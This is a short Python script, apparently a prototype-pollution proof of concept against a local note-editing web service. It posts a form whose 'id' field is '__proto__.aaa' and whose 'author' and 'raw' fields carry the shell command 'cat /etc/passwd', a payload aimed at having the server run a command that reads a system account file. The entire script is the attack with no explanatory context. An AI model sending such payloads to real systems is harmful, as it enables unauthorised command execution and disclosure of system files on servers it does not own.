import requests

url = "http://localhost:8080/edit_note"
data = {
    "id": "__proto__.aaa",
    "author": "cat /etc/passwd",
    "raw": "cat /etc/passwd"
}
req = requests.post(url, data=data)
print(req)